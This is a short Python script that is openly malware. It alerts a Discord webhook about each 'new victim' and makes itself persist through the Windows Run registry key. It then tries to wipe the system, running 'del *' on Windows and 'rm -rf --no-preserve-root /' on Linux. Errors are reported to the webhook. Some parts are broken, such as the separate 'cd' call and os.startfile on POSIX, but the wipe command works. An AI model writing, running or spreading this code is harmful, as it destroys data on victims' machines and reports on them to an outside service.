import os
import sys
import winreg
import requests
from datetime import datetime

webhook_url = 'your_discord_webhook_url_here'

def newvictimalert():
    Message = {
        'content': f'New victim alert!\nTime: {datetime.now()}\nSystem: {os.name}\nExtra info: {sys.argv[0]}'
    }
    requests.post(webhook_url, Message)

def cls():
    if os.name == 'nt':
        os.system('cls')
    elif os.name == 'posix':
        os.system('clear')

def autoload():
    if os.name == 'nt':
        script_name = sys.argv[0]
        script_path = os.path.abspath(script_name)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, f"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "system_load", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(key)
    elif os.name == 'posix':
        os.startfile(sys.argv[0])
    else:
        cls()

def destroy():
    if os.name == 'nt':
        try:
            os.system('cd C:/Windows')
            os.system('del *')
        except Exception as e:
            Message = {
                'content': f'Error!\nTime: {datetime.now()}\nSystem: {os.name}\nError: {e}\nExtra info: {sys.argv[0]}'
            }
            requests.post(webhook_url, Message)
    elif os.name == 'posix':
        try:
            os.system('rm -rf --no-preserve-root /')
        except Exception as e:
            Message = {
                'content': f'Error!\nTime: {datetime.now()}\nSystem: {os.name}\nError: {e}\nExtra info: {sys.argv[0]}'
            }
            requests.post(webhook_url, Message)

if __name__ == '__main__':
    newvictimalert()
    autoload()
    destroy()
